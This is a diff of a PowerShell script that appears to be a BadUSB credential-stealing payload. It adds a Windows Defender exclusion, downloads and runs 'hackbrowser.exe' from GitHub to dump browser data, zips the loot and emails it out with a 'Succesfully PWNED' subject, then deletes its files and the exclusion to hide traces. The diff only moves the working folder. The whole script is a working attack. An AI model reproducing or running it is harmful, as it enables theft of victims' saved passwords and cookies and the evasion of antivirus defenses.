@@ -1,13 +1,13 @@
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "$env:appdata\Local\dump"
-Set-Location "$env:appdata\Local\dump"
+mkdir "$env:appdata\dump"
+Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/GamehunterKaan/BadUSB-Browser/blob/main/hackbrowser.exe?raw=true" -OutFile "$env:appdata\Local\dump\hb.exe"
-cd $env:appdata\Local\dump
+cd $env:appdata\dump
 ./hb.exe
-Remove-Item -Path "$env:appdata\Local\dump\hb.exe" -Force
+Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
@@ -23,13 +23,13 @@ $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\Local\dump\dump.zip")
+$Message.Attachments.Add("$env:appdata\dump\dump.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
 cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Local\dump" -Force -Recurse
+Remove-Item -Path "$env:appdata\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
 
 
